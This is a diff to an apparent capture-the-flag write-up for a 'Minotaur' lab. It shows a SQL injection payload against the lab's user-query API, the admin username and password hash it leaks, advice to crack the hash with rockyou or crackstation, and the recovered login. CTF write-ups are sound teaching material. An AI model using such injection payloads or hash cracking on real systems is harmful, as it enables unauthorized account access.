@@ -48,13 +48,14 @@ you get presented with an api interface where you can query for user data:
 lets try quering for our user Daedalus
 you will get back the name and hashed password of him
 if you look at inspect element theres a hint hidden it tells you something about permissions ....
- <!-- Minotaur!!! Told you not to keep permissions in the same shelf as all the others especially if the permission is equal to admin -->
+``` <!-- Minotaur!!! Told you not to keep permissions in the same shelf as all the others especially if the permission is equal to admin --> ```
 
 if you look at the structure of the paramenters you see at the naming pattern (namePeoplenameCreature) there may be a parameter called permissionPeople
 so lets try out an sql-injection with this information
 ``` Daedalus' OR permissionPeople='admin ```
 
-you get this result gives you a new user: 5    M!n0taur    1765db9457f496a39859209ee81fbda4
+you get this result gives you a new user: 
+```5    M!n0taur    1765db9457f496a39859209ee81fbda4 ```
 you can either crack this hash (rockyou list), or you can use a website like crackstation
 now login with the new userinformation you got
 user: M!n0taur password: aminotauro
